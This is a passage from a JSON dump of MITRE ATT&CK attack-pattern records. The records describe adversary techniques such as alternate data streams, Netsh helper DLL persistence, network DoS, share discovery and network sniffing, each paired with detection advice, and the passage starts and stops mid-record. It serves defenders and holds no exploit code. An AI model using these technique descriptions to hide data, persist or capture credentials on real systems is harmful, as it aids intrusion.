Retrieved March 21, 2018.\",\"source_name\":\"Microsoft NTFS File Attributes Aug 2010\",\"url\":\"https://blogs.technet.microsoft.com/askcore/2010/08/25/ntfs-file-attributes/\"},{\"description\":\"Microsoft. (n.d.). File Streams. Retrieved December 2, 2014.\",\"source_name\":\"Microsoft File Streams\",\"url\":\"http://msdn.microsoft.com/en-us/library/aa364404\"},{\"description\":\"Arntz, P. (2015, July 22). Introduction to Alternate Data Streams. Retrieved March 21, 2018.\",\"source_name\":\"MalwareBytes ADS July 2015\",\"url\":\"https://blog.malwarebytes.com/101/2015/07/introduction-to-alternate-data-streams/\"},{\"description\":\"Marlin, J. (2013, March 24). Alternate Data Streams in NTFS. Retrieved March 21, 2018.\",\"source_name\":\"Microsoft ADS Mar 2014\",\"url\":\"https://blogs.technet.microsoft.com/askcore/2013/03/24/alternate-data-streams-in-ntfs/\"},{\"description\":\"Harrell, C. (2012, December 11). Extracting ZeroAccess from NTFS Extended Attributes. Retrieved June 3, 2016.\",\"source_name\":\"Journey into IR ZeroAccess NTFS EA\",\"url\":\"http://journeyintoir.blogspot.com/2012/12/extracting-zeroaccess-from-ntfs.html\"},{\"description\":\"Moe, O. (2018, January 14). Putting Data in Alternate Data Streams and How to Execute It. Retrieved June 30, 2018.\",\"source_name\":\"Oddvar Moe ADS1 Jan 2018\",\"url\":\"https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/\"},{\"description\":\"Moe, O. (2018, April 11). Putting Data in Alternate Data Streams and How to Execute It - Part 2. Retrieved June 30, 2018.\",\"source_name\":\"Oddvar Moe ADS2 Apr 2018\",\"url\":\"https://oddvar.moe/2018/04/11/putting-data-in-alternate-data-streams-and-how-to-execute-it-part-2/\"},{\"description\":\"Pravs. (2009, May 25). What you need to know about alternate data streams in windows? Is your Data secure? Can you restore that?. Retrieved March 21, 2018.\",\"source_name\":\"Symantec ADS May 2009\",\"url\":\"https://www.symantec.com/connect/articles/what-you-need-know-about-alternate-data-streams-windows-your-data-secure-can-you-restore\"}],\"id\":\"attack-pattern--f2857333-11d4-45bf-b064-2c28d8525be5\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"}],\"modified\":\"2020-03-29T22:46:56.308Z\",\"name\":\"NTFS File Attributes\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Oddvar Moe, @oddvarmoe\",\"Red Canary\"],\"x_mitre_data_sources\":[\"Process command-line parameters\",\"API monitoring\",\"File monitoring\"],\"x_mitre_defense_bypassed\":[\"Anti-virus\",\"Host forensic analysis\",\"Signature-based detection\"],\"x_mitre_detection\":\"Forensic techniques exist to identify information stored in NTFS EA. (Citation: Journey into IR ZeroAccess NTFS EA) Monitor calls to the <code>ZwSetEaFile</code> and <code>ZwQueryEaFile</code> Windows API functions as well as binaries used to interact with EA, (Citation: Oddvar Moe ADS1 Jan 2018) (Citation: Oddvar Moe ADS2 Apr 2018) and consider regularly scanning for the presence of modified information. (Citation: SpectorOps Host-Based Jul 2017)\\n\\nThere are many ways to create and interact with ADSs using Windows utilities. Monitor for operations (execution, copies, etc.) with file names that contain colons. This syntax (ex: <code>file.ext:ads[.ext]</code>) is commonly associated with ADSs. (Citation: Microsoft ADS Mar 2014) (Citation: Oddvar Moe ADS1 Jan 2018) (Citation: Oddvar Moe ADS2 Apr 2018) For a more exhaustive list of utilities that can be used to execute and create ADSs, see https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f.\\n\\nThe Streams tool of Sysinternals can be used to uncover files with ADSs. The <code>dir /r</code> command can also be used to display ADSs. (Citation: Symantec ADS May 2009) Many PowerShell commands (such as Get-Item, Set-Item, Remove-Item, and Get-ChildItem) can also accept a <code>-stream</code> parameter to interact with ADSs. (Citation: MalwareBytes ADS July 2015) (Citation: Microsoft ADS Mar 2014)\",\"x_mitre_is_subtechnique\":true,\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_system_requirements\":[\"NTFS partitioned hard drive\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-05-31T21:31:17.472Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may directly interact with the native OS application programming interface (API) to execute behaviors. Native APIs provide a controlled means of calling low-level OS services within the kernel, such as those involving hardware/devices, memory, and processes.(Citation: NT API Windows)(Citation: Linux Kernel API) These native APIs are leveraged by the OS during system boot (when other system components are not yet initialized) as well as carrying out tasks and requests during routine operations.\\n\\nFunctionality provided by native APIs are often also exposed to user-mode applications via interfaces and libraries. For example, functions such as the Windows API <code>CreateProcess()</code> or GNU <code>fork()</code> will allow programs and scripts to start other processes.(Citation: Microsoft CreateProcess)(Citation: GNU Fork) This may allow API callers to execute a binary, run a CLI command, load modules, etc. as thousands of similar API functions exist for various system operations.(Citation: Microsoft Win32)(Citation: LIBC)(Citation: GLIBC)\\n\\nHigher level software frameworks, such as Microsoft .NET and macOS Cocoa, are also available to interact with native APIs. These frameworks typically provide language wrappers/abstractions to API functionalities and are designed for ease-of-use/portability of code.(Citation: Microsoft NET)(Citation: Apple Core Services)(Citation: MACOS Cocoa)(Citation: macOS Foundation)\\n\\nAdversaries may abuse these native API functions as a means of executing behaviors. Similar to [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), the native API and its hierarchy of interfaces, provide mechanisms to interact with and utilize various components of a victimized system.\",\"external_references\":[{\"external_id\":\"T1106\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1106\"},{\"description\":\"The NTinterlnals.net team. (n.d.). Nowak, T. Retrieved June 25, 2020.\",\"source_name\":\"NT API Windows\",\"url\":\"https://undocumented.ntinternals.net/\"},{\"description\":\"Linux Kernel Organization, Inc. (n.d.). The Linux Kernel API. Retrieved June 25, 2020.\",\"source_name\":\"Linux Kernel API\",\"url\":\"https://www.kernel.org/doc/html/v4.12/core-api/kernel-api.html\"},{\"description\":\"Microsoft. (n.d.). CreateProcess function. Retrieved December 5, 2014.\",\"source_name\":\"Microsoft CreateProcess\",\"url\":\"http://msdn.microsoft.com/en-us/library/ms682425\"},{\"description\":\"Free Software Foundation, Inc.. (2020, June 18). Creating a Process. Retrieved June 25, 2020.\",\"source_name\":\"GNU Fork\",\"url\":\"https://www.gnu.org/software/libc/manual/html_node/Creating-a-Process.html\"},{\"description\":\"Microsoft. (n.d.). Programming reference for the Win32 API. Retrieved March 15, 2020.\",\"source_name\":\"Microsoft Win32\",\"url\":\"https://docs.microsoft.com/en-us/windows/win32/api/\"},{\"description\":\"Kerrisk, M. (2016, December 12). libc(7) — Linux manual page. Retrieved June 25, 2020.\",\"source_name\":\"LIBC\",\"url\":\"https://man7.org/linux/man-pages//man7/libc.7.html\"},{\"description\":\"glibc developer community. (2020, February 1). The GNU C Library (glibc). Retrieved June 25, 2020.\",\"source_name\":\"GLIBC\",\"url\":\"https://www.gnu.org/software/libc/\"},{\"description\":\"Microsoft. (n.d.). What is .NET Framework?. Retrieved March 15, 2020.\",\"source_name\":\"Microsoft NET\",\"url\":\"https://dotnet.microsoft.com/learn/dotnet/what-is-dotnet-framework\"},{\"description\":\"Apple. (n.d.). Core Services. Retrieved June 25, 2020.\",\"source_name\":\"Apple Core Services\",\"url\":\"https://developer.apple.com/documentation/coreservices\"},{\"description\":\"Apple. (2015, September 16). Cocoa Application Layer. Retrieved June 25, 2020.\",\"source_name\":\"MACOS Cocoa\",\"url\":\"https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/OSX_Technology_Overview/CocoaApplicationLayer/CocoaApplicationLayer.html#//apple_ref/doc/uid/TP40001067-CH274-SW1\"},{\"description\":\"Apple. (n.d.). Foundation. Retrieved July 1, 2020.\",\"source_name\":\"macOS Foundation\",\"url\":\"https://developer.apple.com/documentation/foundation\"}],\"id\":\"attack-pattern--391d824f-0ef1-47a0-b0ee-c59a75e27670\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"execution\"}],\"modified\":\"2020-07-01T16:19:54.646Z\",\"name\":\"Native API\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Stefan Kanthak\"],\"x_mitre_data_sources\":[\"System calls\",\"Loaded DLLs\",\"API monitoring\",\"Process monitoring\"],\"x_mitre_detection\":\"Monitoring API calls may generate a significant amount of data and may not be useful for defense unless collected under specific circumstances, since benign use of API functions are common and difficult to distinguish from malicious behavior. Correlation of other events with behavior surrounding API function calls using API monitoring will provide additional context to an event that may assist in determining if it is due to malicious behavior. Correlation of activity by process lineage by process ID may be sufficient. \\n\\nUtilization of the Windows API may involve processes loading/accessing system DLLs associated with providing called functions (ex: kernel32.dll, advapi32.dll, user32.dll, and gdi32.dll). Monitoring for DLL loads, especially to abnormal/unusual or potentially malicious processes, may indicate abuse of the Windows API. Though noisy, this data can be combined with other indicators to identify adversary activity. \",\"x_mitre_is_subtechnique\":false,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"Windows\",\"macOS\",\"Linux\"],\"x_mitre_remote_support\":false,\"x_mitre_version\":\"2.0\"}",
    "{\"created\":\"2017-05-31T21:31:40.168Z\",\"external_references\":[{\"external_id\":\"T1128\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1128\"},{\"description\":\"Microsoft. (n.d.). Using Netsh. Retrieved February 13, 2017.\",\"source_name\":\"TechNet Netsh\",\"url\":\"https://technet.microsoft.com/library/bb490939.aspx\"},{\"description\":\"Demaske, M. (2016, September 23). USING NETSHELL TO EXECUTE EVIL DLLS AND PERSIST ON A HOST. Retrieved April 8, 2017.\",\"source_name\":\"Demaske Netsh Persistence\",\"url\":\"https://htmlpreview.github.io/?https://github.com/MatthewDemaske/blogbackup/blob/master/netshell.html\"},{\"description\":\"Smeets, M. (2016, September 26). NetshHelperBeacon. Retrieved February 13, 2017.\",\"source_name\":\"Github Netsh Helper CS Beacon\",\"url\":\"https://github.com/outflankbv/NetshHelperBeacon\"}],\"id\":\"attack-pattern--bb0e0cb5-f3e4-4118-a4cb-6bf13bfbc9f2\",\"modified\":\"2020-01-24T14:27:28.869Z\",\"name\":\"Netsh Helper DLL\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2020-01-24T14:26:51.207Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may establish persistence by executing malicious content triggered by Netsh Helper DLLs. Netsh.exe (also referred to as Netshell) is a command-line scripting utility used to interact with the network configuration of a system. It contains functionality to add helper DLLs for extending functionality of the utility. (Citation: TechNet Netsh) The paths to registered netsh.exe helper DLLs are entered into the Windows Registry at <code>HKLM\\\\SOFTWARE\\\\Microsoft\\\\Netsh</code>.\\n\\nAdversaries can use netsh.exe helper DLLs to trigger execution of arbitrary code in a persistent manner. This execution would take place anytime netsh.exe is executed, which could happen automatically, with another persistence technique, or if other software (ex: VPN) is present on the system that executes netsh.exe as part of its normal functionality. (Citation: Github Netsh Helper CS Beacon)(Citation: Demaske Netsh Persistence)\",\"external_references\":[{\"external_id\":\"T1546.007\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1546/007\"},{\"description\":\"Microsoft. (n.d.). Using Netsh. Retrieved February 13, 2017.\",\"source_name\":\"TechNet Netsh\",\"url\":\"https://technet.microsoft.com/library/bb490939.aspx\"},{\"description\":\"Smeets, M. (2016, September 26). NetshHelperBeacon. Retrieved February 13, 2017.\",\"source_name\":\"Github Netsh Helper CS Beacon\",\"url\":\"https://github.com/outflankbv/NetshHelperBeacon\"},{\"description\":\"Demaske, M. (2016, September 23). USING NETSHELL TO EXECUTE EVIL DLLS AND PERSIST ON A HOST. Retrieved April 8, 2017.\",\"source_name\":\"Demaske Netsh Persistence\",\"url\":\"https://htmlpreview.github.io/?https://github.com/MatthewDemaske/blogbackup/blob/master/netshell.html\"}],\"id\":\"attack-pattern--f63fe421-b1d1-45c0-b8a7-02cd16ff2bed\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"privilege-escalation\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"persistence\"}],\"modified\":\"2020-03-24T18:28:07.793Z\",\"name\":\"Netsh Helper DLL\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Matthew Demaske, Adaptforward\"],\"x_mitre_data_sources\":[\"Process command-line parameters\",\"Process monitoring\",\"Windows Registry\",\"DLL monitoring\"],\"x_mitre_detection\":\"It is likely unusual for netsh.exe to have any child processes in most environments. Monitor process executions and investigate any child processes spawned by netsh.exe for malicious behavior. Monitor the <code>HKLM\\\\SOFTWARE\\\\Microsoft\\\\Netsh</code> registry key for any new or suspicious entries that do not correlate with known system files or benign software. (Citation: Demaske Netsh Persistence)\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"Administrator\",\"SYSTEM\"],\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2019-04-17T20:23:15.105Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may perform Network Denial of Service (DoS) attacks to degrade or block the availability of targeted resources to users. Network DoS can be performed by exhausting the network bandwidth services rely on. Example resources include specific websites, email services, DNS, and web-based applications. Adversaries have been observed conducting network DoS attacks for political purposes(Citation: FireEye OpPoisonedHandover February 2016) and to support other malicious activities, including distraction(Citation: FSISAC FraudNetDoS September 2012), hacktivism, and extortion.(Citation: Symantec DDoS October 2014)\\n\\nA Network DoS will occur when the bandwidth capacity of the network connection to a system is exhausted due to the volume of malicious traffic directed at the resource or the network connections and network devices the resource relies on. For example, an adversary may send 10Gbps of traffic to a server that is hosted by a network with a 1Gbps connection to the internet. This traffic can be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).\\n\\nTo perform Network DoS attacks several aspects apply to multiple methods, including IP address spoofing, and botnets.\\n\\nAdversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.\\n\\nFor DoS attacks targeting the hosting system directly, see [Endpoint Denial of Service](https://attack.mitre.org/techniques/T1499).\",\"external_references\":[{\"external_id\":\"T1498\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1498\"},{\"description\":\"Ned Moran, Mike Scott, Mike Oppenheim of FireEye. (2014, November 3). Operation Poisoned Handover: Unveiling Ties Between APT Activity in Hong Kong’s Pro-Democracy Movement. Retrieved April 18, 2019.\",\"source_name\":\"FireEye OpPoisonedHandover February 2016\",\"url\":\"https://www.fireeye.com/blog/threat-research/2014/11/operation-poisoned-handover-unveiling-ties-between-apt-activity-in-hong-kongs-pro-democracy-movement.html\"},{\"description\":\"FS-ISAC. (2012, September 17). Fraud Alert – Cyber Criminals Targeting Financial Institution Employee Credentials to Conduct Wire Transfer Fraud. Retrieved April 18, 2019.\",\"source_name\":\"FSISAC FraudNetDoS September 2012\",\"url\":\"https://www.ic3.gov/media/2012/FraudAlertFinancialInstitutionEmployeeCredentialsTargeted.pdf\"},{\"description\":\"Wueest, C.. (2014, October 21). The continued rise of DDoS attacks. Retrieved April 24, 2019.\",\"source_name\":\"Symantec DDoS October 2014\",\"url\":\"https://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/the-continued-rise-of-ddos-attacks.pdf\"},{\"description\":\"Cisco. (n.d.). Detecting and Analyzing Network Threats With NetFlow. Retrieved April 25, 2019.\",\"source_name\":\"Cisco DoSdetectNetflow\",\"url\":\"https://www.cisco.com/c/en/us/td/docs/ios-xml/ios/netflow/configuration/15-mt/nf-15-mt-book/nf-detct-analy-thrts.pdf\"}],\"id\":\"attack-pattern--d74c4a7e-ffbf-432f-9365-7ebf1f787cab\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"impact\"}],\"modified\":\"2020-03-29T01:11:28.903Z\",\"name\":\"Network Denial of Service\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Sensor health and status\",\"Network protocol analysis\",\"Netflow/Enclave netflow\",\"Network intrusion detection system\",\"Network device logs\"],\"x_mitre_detection\":\"Detection of Network DoS can sometimes be achieved before the traffic volume is sufficient to cause impact to the availability of the service, but such response time typically requires very aggressive monitoring and responsiveness or services provided by an upstream network service provider. Typical network throughput monitoring tools such as netflow(Citation: Cisco DoSdetectNetflow), SNMP, and custom scripts can be used to detect sudden increases in network or service utilization. Real-time, automated, and qualitative study of the network traffic can identify a sudden surge in one type of protocol can be used to detect an Network DoS event as it starts. Often, the lead time may be small and the indicator of an event availability of the network or service drops. The analysis tools mentioned can then be used to determine the type of DoS causing the outage and help with remediation.\",\"x_mitre_impact_type\":[\"Availability\"],\"x_mitre_is_subtechnique\":false,\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\",\"AWS\",\"GCP\",\"Azure AD\",\"SaaS\",\"Azure\",\"Office 365\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-01-10T18:01:03.666Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may use network logon scripts automatically executed at logon initialization to establish persistence. Network logon scripts can be assigned using Active Directory or Group Policy Objects.(Citation: Petri Logon Script AD) These logon scripts run with the privileges of the user they are assigned to. Depending on the systems within the network, initializing one of these scripts could apply to more than one or potentially all systems.  \\n \\nAdversaries may use these scripts to maintain persistence on a network. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary.\",\"external_references\":[{\"external_id\":\"T1037.003\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1037/003\"},{\"description\":\"Daniel Petri. (2009, January 8). Setting up a Logon Script through Active Directory Users and Computers in Windows Server 2008. Retrieved November 15, 2019.\",\"source_name\":\"Petri Logon Script AD\",\"url\":\"https://www.petri.com/setting-up-logon-script-through-active-directory-users-computers-windows-server-2008\"}],\"id\":\"attack-pattern--c63a348e-ffc2-486a-b9d9-d7f11ec54d99\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"persistence\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"privilege-escalation\"}],\"modified\":\"2020-03-24T23:45:25.625Z\",\"name\":\"Network Logon Script\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Process monitoring\",\"File monitoring\"],\"x_mitre_detection\":\"Monitor logon scripts for unusual access by abnormal users or at abnormal times. Look for files added or modified by unusual accounts outside of normal administration duties. Monitor running process for actions that could be indicative of abnormal programs or executables running upon logon.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-05-31T21:30:43.915Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may attempt to get a listing of services running on remote hosts, including those that may be vulnerable to remote software exploitation. Methods to acquire this information include port scans and vulnerability scans using tools that are brought onto a system. \\n\\nWithin cloud environments, adversaries may attempt to discover services running on other cloud hosts. Additionally, if the cloud environment is connected to a on-premises environment, adversaries may be able to identify services running on non-cloud systems as well.\",\"external_references\":[{\"external_id\":\"T1046\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1046\"},{\"external_id\":\"CAPEC-300\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/300.html\"}],\"id\":\"attack-pattern--e3a12395-188d-4051-9a16-ea8e14d07b88\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"discovery\"}],\"modified\":\"2020-03-11T19:55:53.828Z\",\"name\":\"Network Service Scanning\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Praetorian\"],\"x_mitre_data_sources\":[\"Netflow/Enclave netflow\",\"Network protocol analysis\",\"Packet capture\",\"Process command-line parameters\",\"Process use of network\"],\"x_mitre_detection\":\"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\\n\\nNormal, benign system and network events from legitimate remote service scanning may be uncommon, depending on the environment and how they are used. Legitimate open port and vulnerability scanning may be conducted within the environment and will need to be deconflicted with any detection capabilities developed. Network intrusion detection systems can also be used to identify scanning activity. Monitor for process use of the networks and inspect intra-network flows to detect port scans.\",\"x_mitre_is_subtechnique\":false,\"x_mitre_permissions_required\":[\"Administrator\",\"SYSTEM\",\"User\"],\"x_mitre_platforms\":[\"Linux\",\"Windows\",\"macOS\",\"AWS\",\"GCP\",\"Azure\"],\"x_mitre_version\":\"2.1\"}",
    "{\"created\":\"2017-05-31T21:31:38.350Z\",\"external_references\":[{\"external_id\":\"T1126\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1126\"},{\"description\":\"Microsoft. (n.d.). Net Use. Retrieved November 25, 2016.\",\"source_name\":\"Technet Net Use\",\"url\":\"https://technet.microsoft.com/bb490717.aspx\"}],\"id\":\"attack-pattern--e7eab98d-ae11-4491-bd28-a53ba875865a\",\"modified\":\"2020-01-31T12:39:48.118Z\",\"name\":\"Network Share Connection Removal\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2020-01-31T12:39:18.816Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may remove share connections that are no longer useful in order to clean up traces of their operation. Windows shared drive and [Windows Admin Shares](https://attack.mitre.org/techniques/T1077) connections can be removed when no longer needed. [Net](https://attack.mitre.org/software/S0039) is an example utility that can be used to remove network share connections with the <code>net use \\\\\\\\system\\\\share /delete</code> command. (Citation: Technet Net Use)\",\"external_references\":[{\"external_id\":\"T1070.005\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1070/005\"},{\"description\":\"Microsoft. (n.d.). Net Use. Retrieved November 25, 2016.\",\"source_name\":\"Technet Net Use\",\"url\":\"https://technet.microsoft.com/bb490717.aspx\"}],\"id\":\"attack-pattern--a750a9f6-0bde-4bb3-9aae-1e2786e9780c\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"}],\"modified\":\"2020-01-31T12:39:18.816Z\",\"name\":\"Network Share Connection Removal\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Authentication logs\",\"Packet capture\",\"Process command-line parameters\",\"Process monitoring\"],\"x_mitre_defense_bypassed\":[\"Host forensic analysis\"],\"x_mitre_detection\":\"Network share connections may be common depending on how an network environment is used. Monitor command-line invocation of <code>net use</code> commands associated with establishing and removing remote shares over SMB, including following best practices for detection of [Windows Admin Shares](https://attack.mitre.org/techniques/T1077). SMB traffic between systems may also be captured and decoded to look for related network share session and file transfer activity. Windows authentication logs are also useful in determining when authenticated network shares are established and by which account, and can be used to correlate network share activity to other events to investigate potentially malicious activity.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"Administrator\",\"User\"],\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_system_requirements\":[\"Established network share connection to a remote system. Level of access depends on permissions of the account used.\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-12-14T16:46:06.044Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to gather as a precursor for Collection and to identify potential systems of interest for Lateral Movement. Networks often contain shared network drives and folders that enable users to access file directories on various systems across a network. \\n\\nFile sharing over a Windows network occurs over the SMB protocol. (Citation: Wikipedia Shared Resource) (Citation: TechNet Shared Folder) [Net](https://attack.mitre.org/software/S0039) can be used to query a remote system for available shared drives using the <code>net view \\\\\\\\remotesystem</code> command. It can also be used to query shared drives on the local system using <code>net share</code>.\\n\\nCloud virtual networks may contain remote network shares or file storage services accessible to an adversary after they have obtained access to a system. For example, AWS, GCP, and Azure support creation of Network File System (NFS) shares and Server Message Block (SMB) shares that may be mapped on endpoint or cloud-based systems.(Citation: Amazon Creating an NFS File Share)(Citation: Google File servers on Compute Engine)\",\"external_references\":[{\"external_id\":\"T1135\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1135\"},{\"external_id\":\"CAPEC-643\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/643.html\"},{\"description\":\"Wikipedia. (2017, April 15). Shared resource. Retrieved June 30, 2017.\",\"source_name\":\"Wikipedia Shared Resource\",\"url\":\"https://en.wikipedia.org/wiki/Shared_resource\"},{\"description\":\"Microsoft. (n.d.). Share a Folder or Drive. Retrieved June 30, 2017.\",\"source_name\":\"TechNet Shared Folder\",\"url\":\"https://technet.microsoft.com/library/cc770880.aspx\"},{\"description\":\"Amazon. (n.d.). Creating an NFS File Share. Retrieved October 23, 2019.\",\"source_name\":\"Amazon Creating an NFS File Share\",\"url\":\"https://docs.aws.amazon.com/storagegateway/latest/userguide/CreatingAnNFSFileShare.html\"},{\"description\":\"Google Cloud. (2019, October 10). File servers on Compute Engine. Retrieved October 23, 2019.\",\"source_name\":\"Google File servers on Compute Engine\",\"url\":\"https://cloud.google.com/solutions/filers-on-compute-engine\"}],\"id\":\"attack-pattern--3489cfc5-640f-4bb3-a103-9137b97de79f\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"discovery\"}],\"modified\":\"2020-03-15T00:59:10.149Z\",\"name\":\"Network Share Discovery\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Praetorian\"],\"x_mitre_data_sources\":[\"Process monitoring\",\"Process command-line parameters\",\"Network protocol analysis\",\"Process use of network\"],\"x_mitre_detection\":\"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\\n\\nNormal, benign system and network events related to legitimate remote system discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\\n\\nIn cloud-based systems, native logging can be used to identify access to certain APIs and dashboards that may contain system information. Depending on how the environment is used, that data alone may not be sufficient due to benign use during normal operations.\",\"x_mitre_is_subtechnique\":false,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"macOS\",\"Windows\",\"AWS\",\"GCP\",\"Azure\",\"Linux\"],\"x_mitre_version\":\"2.1\"}",
    "{\"created\":\"2017-05-31T21:30:41.399Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may sniff network traffic to capture information about an environment, including authentication material passed over the network. Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection. An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.\\n\\nData captured via this technique may include user credentials, especially those sent over an insecure, unencrypted protocol. Techniques for name service resolution poisoning, such as [LLMNR/NBT-NS Poisoning and SMB Relay](https://attack.mitre.org/techniques/T1557/001), can also be used to capture credentials to websites, proxies, and internal systems by redirecting traffic to an adversary.\\n\\nNetwork sniffing may also reveal configuration details, such as running services, version numbers, and other network characteristics (e.g. IP addresses, hostnames, VLAN IDs) necessary for subsequent Lateral Movement and/or Defense Evasion activities.\",\"external_references\":[{\"external_id\":\"T1040\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1040\"},{\"external_id\":\"CAPEC-158\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/158.html\"}],\"id\":\"attack-pattern--3257eb21-f9a7-4430-8de1-d8b6e288f529\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"credential-access\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"discovery\"}],\"modified\":\"2020-03-25T21:03:49.610Z\",\"name\":\"Network Sniffing\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Network device logs\",\"Host network interface\",\"Netflow/Enclave netflow\",\"Process monitoring\"],\"x_mitre_detection\":\"Detecting the events leading up to sniffing network traffic may be the best method of detection. From the host level, an adversary would likely need to perform a man-in-the-middle attack against other devices on a wired network in order to capture traffic that was not to or from the current compromised system. This change in the flow of information is detectable at the enclave network level. Monitor for ARP spoofing and gratuitous ARP broadcasts. Detecting compromised network 